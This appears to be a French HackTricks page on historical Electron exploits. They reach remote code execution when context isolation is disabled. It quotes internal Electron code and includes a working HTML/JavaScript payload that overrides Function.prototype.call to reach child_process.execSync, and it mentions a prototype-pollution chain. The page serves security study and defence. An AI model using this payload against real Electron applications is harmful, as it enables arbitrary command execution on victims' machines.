# RCE via isolation du contexte d’Electron au moyen de code interne

{{#include ../../banners/hacktricks-training.md}}

Il s’agit de **techniques d’exploitation historiques** pour les applications Electron qui exécutaient du contenu non fiable dans le renderer sans isolation du contexte. L’isolation du contexte est activée par défaut depuis Electron 12 et reste un paramètre de sécurité recommandé.<sup>[[1]](#references)</sup> Les détails internes varient selon les versions d’Electron et de Node.js ; reproduisez donc la chaîne d’exploitation avec les versions intégrées à l’application cible.

## Exemple 1 : remplacer `Function.prototype.call`

Cet exemple est tiré de la présentation de Masato Kinugawa à CureCon.<sup>[[2]](#references)</sup>

Dans la version historique d’Electron concernée, le code ASAR interne enregistrait un écouteur d’événement `exit` sur le processus. Comme le code de la page et le code interne d’Electron partageaient les prototypes JavaScript lorsque l’isolation du contexte était désactivée, le code du renderer pouvait remplacer `Function.prototype.call` avant l’exécution de l’écouteur interne.<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```javascript
process.on("exit", function () {
  for (let p in cachedArchives) {
    if (!hasProp.call(cachedArchives, p)) continue
    cachedArchives[p].destroy()
  }
})
```

![Chemin de code interne d'asar.js d'Electron utilisé dans l'exemple de RCE via contextIsolation](<../../images/image (1070).png>)

L'écouteur a été déclenché par le mécanisme d'événements de Node.js. La page d'origine renvoyait vers un ancien chemin `bin/events.js` ; dans le même commit historique, le code source correspondant se trouve sous `lib/events.js`.<sup>[[5]](#references)</sup>

![Chemin de code de Node events.js atteint par la chaîne de RCE via contextIsolation d'Electron](<../../images/image (793).png>)

Dans ce chemin, `self` est l'objet `process` de Node.js :

![RCE via contextIsolation d'Electron via du code interne d'Electron - Exemple 1 : où "self" est l'objet process de Node](<../../images/image (700).png>)

L'objet `process` historique exposait un chemin vers `require` :

```
process.mainModule.require
```

Comme le répartiteur d’écouteurs appelait le gestionnaire avec l’objet `process`, redéfinir `call` permettait de récupérer cet objet et d’exécuter une commande native :

```html
<script>
  Function.prototype.call = function (process) {
    process.mainModule.require("child_process").execSync("calc")
  }
  location.reload() // Trigger the listener during navigation
</script>
```

## Exemple 2 : prototype pollution

La présentation ElectroVolt démontre une autre chaîne historique qui obtient un objet `require` via la prototype pollution.<sup>[[4]](#references)</sup>

Leak :

<figure><img src="../../images/image (279).png" alt=""><figcaption></figcaption></figure>

Exploit :

<figure><img src="../../images/image (89).png" alt=""><figcaption></figcaption></figure>

## References

- [1] [Documentation Electron - Isolation du contexte](https://www.electronjs.org/docs/latest/tutorial/context-isolation)
- [2] [Electron : abuser de l'absence d'isolation du contexte - CureCon](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=41)
- [3] [Source historique d'Electron - lib/common/asar.js](https://github.com/electron/electron/blob/664c184fcb98bb5b4b6b569553e7f7339d3ba4c5/lib/common/asar.js#L30-L36)
- [4] [ElectroVolt : prendre le contrôle d'applications desktop populaires tout en découvrant une nouvelle surface d'attaque dans Electron](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [5] [Source historique de Node.js - distribution des écouteurs dans `lib/events.js`](https://github.com/nodejs/node/blob/8a44289089a08b7b19fa3c4651b5f1f5d1edd71b/lib/events.js#L156-L231)
{{#include ../../banners/hacktricks-training.md}}
